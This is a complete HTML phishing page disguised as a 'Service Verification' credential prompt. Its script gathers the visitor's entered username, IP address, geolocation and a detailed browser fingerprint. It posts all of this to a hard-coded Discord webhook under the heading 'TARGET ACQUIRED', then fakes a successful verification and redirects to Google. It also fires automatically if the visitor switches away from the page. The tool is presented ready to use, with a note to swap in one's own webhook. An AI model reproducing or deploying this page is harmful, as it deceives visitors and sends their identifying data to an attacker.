<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(145deg, #1e3a8a 0%, #1e40af 50%, #1d4ed8 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><radialGradient id="g" cx="50%" cy="50%"><stop offset="0%" stop-color="%23ffffff11"/><stop offset="50%" stop-color="%23ffffff00"/><stop offset="100%" stop-color="%23ffffff00"/></radialGradient></defs><circle cx="20" cy="20" r="1" fill="url(%23g)"><animate attributeName="r" values="1;2;1" dur="3s" repeatCount="indefinite"/></circle><circle cx="80" cy="80" r="1.5" fill="url(%23g)"><animate attributeName="r" values="1.5;3;1.5" dur="4s" repeatCount="indefinite"/></circle></svg>');
            animation: float 20s infinite linear;
        }
        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(180deg); } }
        
        .container {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(20px);
            padding: 2.5rem;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            max-width: 420px;
            width: 90%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.2);
            position: relative;
            z-index: 1;
        }
        .logo {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            border-radius: 15px;
            margin: 0 auto 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
        }
        h1 { color: #1e293b; margin-bottom: 0.5rem; font-size: 1.6rem; font-weight: 700; }
        .subtitle { color: #64748b; margin-bottom: 2rem; font-size: 0.95rem; }
        input {
            width: 100%; padding: 15px 20px; margin-bottom: 1.5rem;
            border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px;
            transition: all 0.3s ease; background: #f8fafc;
        }
        input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 4px rgba(59,130,246,0.1); }
        .btn {
            width: 100%; padding: 15px; background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
            color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
            cursor: pointer; transition: all 0.3s; position: relative; overflow: hidden;
        }
        .btn::before {
            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        .btn:hover::before { left: 100%; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(59,130,246,0.4); }
        .loading { display: none; margin-top: 1rem; color: #3b82f6; font-weight: 500; }
        .progress { display: none; width: 100%; height: 4px; background: #e2e8f0; border-radius: 2px; overflow: hidden; margin-top: 1rem; }
        .progress-bar { height: 100%; background: linear-gradient(90deg, #3b82f6, #1d4ed8); width: 0%; transition: width 0.3s; border-radius: 2px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔐</div>
        <h1>Service Verification</h1>
        <p class="subtitle">Enter your access credentials to continue</p>
        <input type="text" id="username" placeholder="Username or Access Code" maxlength="64">
        <button class="btn" onclick="initLogger()">Verify & Continue</button>
        <div class="progress"><div class="progress-bar"></div></div>
        <div id="loading" class="loading">🔄 Verifying access... Please wait</div>
    </div>

    <script>
        // 🔥 CONFIG - REPLACE WITH YOUR WEBHOOK
        const WEBHOOKS = {
            discord: 'https://discord.com/api/webhooks/1477352751611777199/70Q3j6g16ZbvYMxPnarbeUs854Sgj-1E1fDzJRrHJB7UWmHGK1zY7kc3Cm6r1knkyw3P'
        };

        function getFingerprint() {
            return {
                userAgent: navigator.userAgent.slice(0, 100),
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled ? 'Yes' : 'No',
                hardware: `${navigator.hardwareConcurrency || 'N/A'}c/${navigator.deviceMemory || 'N/A'}gb`,
                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                canvas: canvasFingerprint(),
                webgl: webglFingerprint(),
                fonts: getFonts()
            };
        }

        function canvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint test', 2, 2);
                return canvas.toDataURL().slice(-32);
            } catch(e) { return 'error'; }
        }

        function webglFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                return gl ? gl.getParameter(gl.RENDERER).slice(0, 30) : 'none';
            } catch(e) { return 'error'; }
        }

        function getFonts() {
            const test = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana'];
            const detected = [];
            const span = document.createElement('span');
            span.style.position = 'absolute';
            span.style.left = '-9999px';
            span.style.fontSize = '72px';
            span.innerHTML = test;
            document.body.appendChild(span);
            
            const defaultWidth = span.offsetWidth;
            for (const font of fonts) {
                span.style.fontFamily = font;
                if (span.offsetWidth !== defaultWidth) detected.push(font);
            }
            document.body.removeChild(span);
            return detected.slice(0, 3).join(',') || 'standard';
        }

        // ✅ FIXED IP RESOLUTION - NO MORE ERRORS
        async function getIPData() {
            const ipPromises = [
                fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => null),
                fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => null),
                fetch('https://icanhazip.com').then(r => r.text()).catch(() => null),
                fetch('https://ifconfig.me').then(r => r.text()).catch(() => null),
                fetch('https://api.ipify.org').then(r => r.text()).catch(() => null)
            ];
            
            const results = await Promise.allSettled(ipPromises);
            let ip = 'unknown';
            
            for (const result of results) {
                if (result.status === 'fulfilled') {
                    const data = result.value;
                    if (typeof data === 'object' && data.ip) {
                        ip = data.ip.trim();
                        break;
                    } else if (typeof data === 'string') {
                        const candidate = data.trim();
                        if (/^(?:\d{1,3}\.){3}\d{1,3}$|(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/.test(candidate)) {
                            ip = candidate;
                            break;
                        }
                    }
                }
            }
            
            let geo = { city: 'N/A', region: 'N/A', country: 'Unknown', country_code: 'XX', org: 'N/A', asn: 'N/A' };
            try {
                const geoPromises = [
                    fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()),
                    fetch(`https://ipinfo.io/${ip}/json`).then(r => r.json())
                ];
                const geoResults = await Promise.allSettled(geoPromises);
                for (const result of geoResults) {
                    if (result.status === 'fulfilled') {
                        const g = result.value;
                        geo = {
                            city: g.city || 'N/A',
                            region: g.region || g.region_name || 'N/A',
                            country: g.country_name || g.country || 'Unknown',
                            country_code: g.country_code || 'XX',
                            org: g.org || g.isp || 'N/A',
                            asn: g.asn || g.as || 'N/A'
                        };
                        break;
                    }
                }
            } catch(e) {}
            
            return { ip, geo };
        }

        function updateProgress(percent) {
            document.querySelector('.progress').style.display = 'block';
            document.querySelector('.progress-bar').style.width = percent + '%';
        }

        async function sendToDiscord(data) {
            const embed = {
                username: '🎯 Advanced IP Tracker',
                embeds: [{
                    title: '🚨 TARGET ACQUIRED',
                    color: 16711680,
                    fields: [
                        { name: '👤 Username', value: data.username || 'N/A', inline: true },
                        { name: '🌐 IP', value: `\`${data.ip}\``, inline: true },
                        { name: '📍 Location', value: `${data.geo.city}, ${data.geo.region}`, inline: true },
                        { name: '🌍 Country', value: data.geo.country, inline: true },
                        { name: '🏢 ISP', value: data.geo.org, inline: true },
                        { name: '🕐 Time', value: new Date().toISOString().slice(0,19).replace('T',' '), inline: true },
                        { name: '💻 Device', value: data.platform, inline: true },
                        { name: '🔧 Hardware', value: data.hardware, inline: true },
                        { name: '🎨 Canvas', value: data.canvas, inline: false },
                        { name: '📱 Screen', value: data.screen, inline: true },
                        { name: '🕶️ Fonts', value: data.fonts, inline: true }
                    ],
                    thumbnail: { 
                        url: `https://flagcdn.com/64x48/${data.geo.country_code.toLowerCase()}.png` 
                    },
                    footer: { 
                        text: `UA: ${data.userAgent} | TZ: ${data.timezone}` 
                    }
                }]
            };
            
            await fetch(WEBHOOKS.discord, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            });
        }

        async function initLogger() {
            const username = document.getElementById('username').value.trim();
            if (!username) {
                alert('Please enter a username');
                return;
            }

            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            document.getElementById('loading').textContent = '🔍 Collecting device info...';

            try {
                updateProgress(20);
                const fp = getFingerprint();
                document.getElementById('loading').textContent = '🌐 Resolving IP address...';

                updateProgress(50);
                const ipData = await getIPData();
                document.getElementById('loading').textContent = '📤 Sending to command center...';

                updateProgress(80);
                const payload = { username, ...fp, ...ipData };
                
                updateProgress(100);
                await sendToDiscord(payload);
                document.getElementById('loading').textContent = '✅ Verification complete!';

                setTimeout(() => {
                    document.body.innerHTML = `
                        <div style="text-align:center;padding:3rem;font-family:sans-serif;color:#666;background:rgba(255,255,255,0.95);border-radius:20px;max-width:400px;margin:2rem auto;">
                            <h2 style="color:#10b981;">✅ Access Verified</h2>
                            <p>Redirecting to secure service...</p>
                        </div>
                    `;
                    setTimeout(() => window.location.href = 'https://www.google.com', 2000);
                }, 1500);

            } catch(error) {
                console.error('Logger error:', error);
                document.getElementById('loading').textContent = '❌ Verification failed. Try again.';
                document.querySelector('.btn').style.display = 'block';
            }
        }

        // Enter key + passive triggers
        document.getElementById('username').addEventListener('keypress', e => {
            if (e.key === 'Enter') initLogger();
        });

        // Auto-trigger if they try to leave
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden' && document.getElementById('username').value.trim()) {
                initLogger();
            }
        });
    </script>
</body>
</html>
